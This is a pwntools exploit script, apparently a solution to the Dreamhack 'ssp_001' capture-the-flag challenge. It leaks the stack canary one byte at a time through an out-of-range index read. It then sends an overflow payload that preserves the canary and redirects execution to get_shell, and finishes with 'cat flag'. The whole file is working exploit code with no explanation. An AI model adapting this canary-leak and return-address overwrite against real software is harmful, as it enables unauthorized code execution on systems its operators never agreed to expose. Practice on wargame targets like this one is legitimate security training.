#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  11064
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./ssp_001', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x080487a5
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def printBox(idx):
	p.sendafter(b"> ", b'P')
	p.sendlineafter(b"index : ", str(idx).encode())

def exitPro(data):
	p.sendafter(b"> ", b'E')
	p.sendlineafter(b"Size : ", str(len(data)).encode())
	p.sendafter(b"Name : ", data)

list = [0]

for i in range(3):
	printBox(0x80 + i + 1)
	p.recvuntil(b" is : ")
	byte = int(p.recvline()[:-1], 16)
	list.append(byte)

canary = b""
for c in list:
	canary += p8(c)

canary = u32(canary)

print(hex(canary))
# GDB()
pl = flat(b"A"*0x40, canary, b"AAAAAAAA", exe.sym.get_shell)
exitPro(pl)
p.sendline(b"cat flag")
p.interactive()
